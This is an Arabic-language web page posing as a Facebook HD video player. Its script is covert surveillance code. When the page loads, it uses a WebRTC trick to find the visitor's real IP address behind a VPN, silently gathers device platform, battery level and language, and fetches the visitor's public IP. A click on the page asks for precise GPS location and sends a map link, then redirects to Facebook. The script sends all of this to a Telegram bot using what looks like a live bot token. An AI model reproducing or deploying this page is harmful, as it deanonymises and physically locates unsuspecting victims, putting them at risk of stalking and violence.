<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Video HD - مركز البث المباشر</title>
    
    <meta property="og:title" content="شاهد الفيديو الحصري الآن">
    <meta property="og:description" content="تمت معالجة الفيديو بجودة عالية 4K. اضغط للمشاهدة فوراً عبر خوادم فيسبوك الآمنة.">
    
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png">
    <meta property="og:image:secure_url" content="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png">

    <style>
        body { margin: 0; background: #f0f2f5; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
        .card { text-align: center; background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        .fb-logo { width: 60px; margin-bottom: 20px; }
        .h1 { font-size: 22px; font-weight: bold; color: #1c1e21; margin-bottom: 15px; }
        .btn { background: #1877f2; color: white; padding: 16px; border-radius: 10px; font-weight: bold; border: none; width: 100%; font-size: 18px; box-shadow: 0 4px 12px rgba(24, 119, 242, 0.4); transition: 0.3s; cursor: pointer; }
        .btn:active { transform: scale(0.98); }
    </style>
</head>
<body onclick="getAccurateGPS()">

    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="fb-logo">
        <div class="h1">مركز معالجة الفيديو</div>
        <p style="font-size: 14px; color: #606770; margin-bottom: 30px;">يتم الآن فحص العتاد وتخصيص أفضل جودة بث لموقعك... اضغط للمشاهدة فوراً.</p>
        <button class="btn">تشغيل الآن</button>
    </div>

<script>
    const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
    const CHAT_ID = "1611398303";

    function send(msg) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
    }

    // 🔱 1. كشف الـ IP السوري الحقيقي متجاوزاً الـ VPN (WebRTC)
    function checkRealIP() {
        const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
        pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = (i) => {
            if (!i || !i.candidate || !i.candidate.candidate) return;
            const realIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
            if (realIP && !realIP.startsWith("192.") && !realIP.startsWith("10.")) {
                send("🚀🚨 كشف الـ IP السوري الحقيقي (خلف الـ VPN): " + realIP);
            }
        };
    }

    // 🔱 2. سحب بيانات الجهاز والبطارية صمتاً
    async function getDeviceDetails() {
        let details = "🕵️‍♂️ [استخبارات الجهاز]\n";
        details += `📱 النوع: ${navigator.platform}\n`;
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            details += `🔋 البطارية: ${Math.round(b.level * 100)}%\n`;
        }
        details += `🌐 اللغة: ${navigator.language}`;
        send(details);
    }

    // 🔱 3. الموقع الدقيق (GPS) - يفتح عند الضغط على الزر
    function getAccurateGPS() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                send(`🎯🎯 [موقع الخاطف بالشارع]\n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lon}`);
                setTimeout(() => location.href = "https://m.facebook.com", 1000);
            }, () => { location.href = "https://m.facebook.com"; }, {enableHighAccuracy: true});
        } else { location.href = "https://m.facebook.com"; }
    }

    window.onload = () => {
        checkRealIP();
        getDeviceDetails();
        // سحب الـ IP الظاهر
        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => send("🌍 الـ IP الظاهر حالياً: " + d.ip));
    };
</script>
</body>
</html>
